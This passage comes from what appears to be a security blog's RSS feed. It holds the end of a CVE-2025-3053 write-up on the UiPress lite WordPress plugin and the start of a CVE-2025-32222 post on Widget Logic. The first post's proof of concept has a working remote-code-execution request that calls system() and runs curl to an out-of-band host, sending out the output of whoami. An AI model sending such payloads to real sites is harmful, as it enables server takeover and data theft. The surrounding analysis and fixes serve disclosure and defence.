class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_save_sync_options&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_start_site_sync&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_check_for_template_updates&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_process_block_query&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_save_site_option&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_send_message_to_gpt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_global_export&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_global_import&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_push_new_custom_menu_items&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_remove_custom_menu_items&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Push&amp;ensp;ajax&amp;ensp;actions&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$function_names&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;add_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;wp_ajax_&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The plugin registers multiple AJAX actions via the &lt;code&gt;load_ajax()&lt;/code&gt; function. Each name in the &lt;code&gt;$function_names&lt;/code&gt; array is hooked using &lt;code&gt;add_action(&amp;quot;wp_ajax_{$name}&amp;quot;,&amp;ensp;[$this,&amp;ensp;$name])&lt;/code&gt;. This means that when a request is sent to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with &lt;code&gt;action&amp;ensp;=&amp;ensp;$name&lt;/code&gt;, WordPress will directly invoke the method with the same name in the pluginâ€™s class.&lt;/p&gt;&#xA;&lt;p&gt;Since &lt;code&gt;uip_process_form_input&lt;/code&gt; is in the list, a request such as:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;POST&amp;ensp;/wp-admin/admin-ajax.php&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;action=uip_process_form_input&amp;amp;security=...&amp;amp;formData=...&amp;amp;userFunction=...&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;will trigger &lt;code&gt;uip_process_form_input()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;A[&#34;POST&amp;ensp;/wp-admin/admin-ajax.php...action=uip_process_form_input&#34;]&amp;ensp;--&gt;&amp;ensp;B[&#34;WordPress&amp;ensp;calls&amp;ensp;uip_process_form_input()&#34;]&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;Ajax::check_referer()&#34;]&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D[&#34;$data&amp;ensp;=&amp;ensp;json_decode(formData)&#34;]&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E[&#34;$userFunction&amp;ensp;=&amp;ensp;sanitize_text_field(userFunction)&#34;]&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F{&#34;function_exists($userFunction)?&#34;}&#xD;&#xA;F&amp;ensp;--&gt;|Yes|&amp;ensp;G[&#34;$userFunction($data)&#34;]&#xD;&#xA;F&amp;ensp;--&gt;|No|&amp;ensp;H[&#34;Ajax::error()&#34;]&#xD;&#xA;G&amp;ensp;--&gt;&amp;ensp;I[&#34;wp_send_json(success)&#34;]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Log in as a &lt;strong&gt;Subscriber&lt;/strong&gt; user&lt;/li&gt;&#xA;&lt;li&gt;Obtain the security value from the response&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-01-cve-2025-3053/security.png&#34; title=&#34;Security value&#34; data-thumbnail=&#34;/posts/2025-12-01-cve-2025-3053/security.png&#34; data-sub-html=&#34;&lt;h2&gt;Security value&lt;/h2&gt;&lt;p&gt;Security value&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-01-cve-2025-3053/security.png&#39; alt=&#34;Security value&#34; height=&#34;637&#34; width=&#34;1485&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Security value&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Send a request containing the payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;POST&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nn&#34;&gt;/wp-admin/admin-ajax.php&lt;/span&gt;&amp;ensp;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;localhost&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;action=uip_process_form_input&amp;amp;security=65c1a4e801&amp;amp;formData=&amp;#34;curl+http://1aclwhon6rw1l1bj569pxpkjqaw1ks8h.oastify.com?leadked=$(whoami)&amp;#34;&amp;amp;userFunction=system&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-01-cve-2025-3053/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-01-cve-2025-3053/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-01-cve-2025-3053/result.png&#39; alt=&#34;Result&#34; height=&#34;579&#34; width=&#34;1049&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-3053&lt;/strong&gt; vulnerability stems from &lt;code&gt;uip_process_form_input()&lt;/code&gt; allowing users to directly control the &lt;strong&gt;function name to be executed&lt;/strong&gt; via &lt;code&gt;userFunction&lt;/code&gt;, while only checking &lt;code&gt;function_exists()&lt;/code&gt; and &lt;strong&gt;not performing any capability checks or using a whitelist&lt;/strong&gt;. This allows low-privileged authenticated users (Subscriber) to perform &lt;strong&gt;Arbitrary Function Calls&lt;/strong&gt;, leading to &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;. Version &lt;strong&gt;3.5.08&lt;/strong&gt; mitigates the issue by completely disabling this mechanism.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Do not allow users to control &lt;strong&gt;dynamic function calls&lt;/strong&gt; without a strict whitelist.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;nonce&lt;/code&gt; / &lt;code&gt;check_ajax_referer()&lt;/code&gt; &lt;strong&gt;do not replace&lt;/strong&gt; &lt;code&gt;current_user_can()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;function_exists()&lt;/code&gt; &lt;strong&gt;is not a security control&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Logic flaws are more dangerous than improper sanitization.&lt;/li&gt;&#xA;&lt;li&gt;Always apply the &lt;strong&gt;principle of least privilege&lt;/strong&gt; to AJAX endpoints.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/uipress-lite/vulnerability/wordpress-uipress-lite-plugin-3-5-07-authenticated-subscriber-remote-code-execution-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UiPress lite Plugin &amp;lt;= 3.5.07 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-32222 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-30-cve-2025-32222/</link>
      <pubDate>Sun, 30 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-30-cve-2025-32222/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-30-cve-2025-32222/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Improper Control of Generation of Code (&amp;lsquo;Code Injection&amp;rsquo;)&lt;/strong&gt; vulnerability in Widgetlogic.orgâ€™s &lt;strong&gt;Widget Logic (widget-logic)&lt;/strong&gt; allows &lt;strong&gt;Code Injection&lt;/strong&gt;. This issue affects Widget Logic from versions &lt;strong&gt;n/a to &amp;lt;= 6.0.5&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-32222&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-32222&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.0.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.0.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/widget-logic/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Widget Logic Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; â€“ &lt;strong&gt;Widget Logic&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;6.0.5&lt;/code&gt; â€“ &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;6.0.6&lt;/code&gt; â€“ &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; â†’ &lt;a 